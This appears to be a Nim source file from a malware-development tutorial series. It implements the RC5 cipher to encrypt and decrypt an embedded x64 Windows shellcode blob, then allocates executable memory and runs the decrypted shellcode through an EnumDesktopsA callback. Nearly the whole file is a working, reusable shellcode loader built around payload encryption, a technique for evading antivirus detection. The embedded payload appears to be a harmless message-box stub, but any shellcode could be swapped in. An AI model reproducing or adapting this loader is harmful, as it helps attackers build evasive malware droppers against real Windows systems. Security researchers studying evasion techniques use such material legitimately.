# hack.nim
# encrypt/decrypt payload via
# RC5 cipher
# author: @cocomelonc
# https://cocomelonc.github.io/malware/2025/04/02/malware-cryptography-40.html
import winim
import strformat

type
  DESKTOPENUMPROCA = proc(lpszDesktop: LPSTR, lParam: LPARAM): WINBOOL {.stdcall.}

proc shiftLeft(v: uint32, n: uint32): uint32 = v shl n
proc shiftRight(v: uint32, n: uint32): uint32 = v shr n

proc rotateLeft(v: uint32, n: uint32): uint32 =
  let n1 = n and 0x1f'u32
  shiftLeft(v, n1) or shiftRight(v, 32 - n1)

proc rotateRight(v: uint32, n: uint32): uint32 =
  let n1 = n and 0x1f'u32
  shiftRight(v, n1) or shiftLeft(v, 32 - n1)

proc expandKey(L: var array[4, uint32], S: var array[26, uint32]) =
  var A, B: uint32 = 0
  var i, j: int = 0
  S[0] = 0xb7e15163'u32
  for k in 1 .. 25:
    S[k] = S[k - 1] + 0x9e3779b9'u32
  for _ in 0 ..< 3 * 26:
    A = rotateLeft(S[i] + A + B, 3)
    S[i] = A
    B = rotateLeft(L[j] + A + B, A + B)
    L[j] = B
    i = (i + 1) mod 26
    j = (j + 1) mod 4

proc encrypt(S: array[26, uint32], inout: var array[2, uint32]) =
  var A = inout[0]
  var B = inout[1]
  A += S[0]
  B += S[1]
  for j in 0 ..< 12:
    A = rotateLeft(A xor B, B) + S[2]
    B = rotateLeft(B xor A, A) + S[3]
  inout[0] = A
  inout[1] = B

proc decrypt(S: array[26, uint32], inout: var array[2, uint32]) =
  var A = inout[0]
  var B = inout[1]
  for j in countdown(12, 1):
    B = rotateRight(B - S[3], A) xor A
    A = rotateRight(A - S[2], B) xor B
  B -= S[1]
  A -= S[0]
  inout[0] = A
  inout[1] = B

when isMainModule:
  var key: array[4, uint32] = [0x243F6A88'u32, 0x85A308D3'u32, 0x452821E6'u32, 0x38D01377'u32]
  var box: array[26, uint32]
  expandKey(key, box)

  var data: seq[byte] = @[
    byte 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
    0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
    0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
    0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
    0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
    0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
    0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
    0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
    0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
    0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
    0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
    0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
    0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
    0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
    0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
  ]

  let dataSize = data.len
  let paddedSize = ((dataSize + 7) and not 7)
  var paddedData = newSeq[byte](paddedSize)
  for i in 0..<data.len:
    paddedData[i] = data[i]

  var encrypted = newSeq[byte](paddedSize)
  var decrypted = newSeq[byte](paddedSize)

  for i in countup(0, paddedSize - 1, 8):
    var chunk: array[2, uint32]
    copyMem(addr chunk, addr paddedData[i], sizeof(chunk))
    encrypt(box, chunk)
    copyMem(addr encrypted[i], addr chunk, sizeof(chunk))
    decrypt(box, chunk)
    copyMem(addr decrypted[i], addr chunk, sizeof(chunk))

  echo "\nencrypted:"
  for b in encrypted:
    stdout.write &"{b:02x} "
  echo "\n\ndecrypted:"
  for b in decrypted[0 ..< data.len]:
    stdout.write &"{b:02x} "
  echo "\n"

  if decrypted[0 ..< data.len] == data:
    echo "encryption and decryption successful. =^..^="
  else:
    echo "failed :("

  let mem = VirtualAlloc(NULL, cast[SIZE_T](data.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  RtlMoveMemory(mem, unsafeAddr decrypted[0], cast[SIZE_T](data.len))
  let shellcodeProc = cast[DESKTOPENUMPROCA](mem)
  discard EnumDesktopsA(GetProcessWindowStation(), shellcodeProc, 0)
